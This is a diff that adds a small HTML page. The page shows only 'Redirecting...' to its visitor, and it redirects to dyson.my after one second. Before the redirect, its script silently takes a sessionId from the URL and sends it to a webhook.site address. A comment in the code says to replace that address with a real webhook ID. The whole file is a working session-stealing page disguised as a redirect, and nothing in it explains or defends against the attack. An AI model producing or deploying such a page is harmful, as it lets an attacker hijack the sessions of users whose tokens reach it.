@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Redirecting...</title>
+    <script>
+      const params = new URLSearchParams(window.location.search);
+      const sessionId = params.get("sessionId");
+      if (sessionId) {
+        fetch("https://webhook.site/your-id?leaked=" + sessionId); // Replace with actual Webhook ID
+      }
+      setTimeout(() => {
+        window.location.href = "https://www.dyson.my";
+      }, 1000);
+    </script>
+  </head>
+  <body>
+    <p>Redirecting...</p>
+  </body>
+</html>
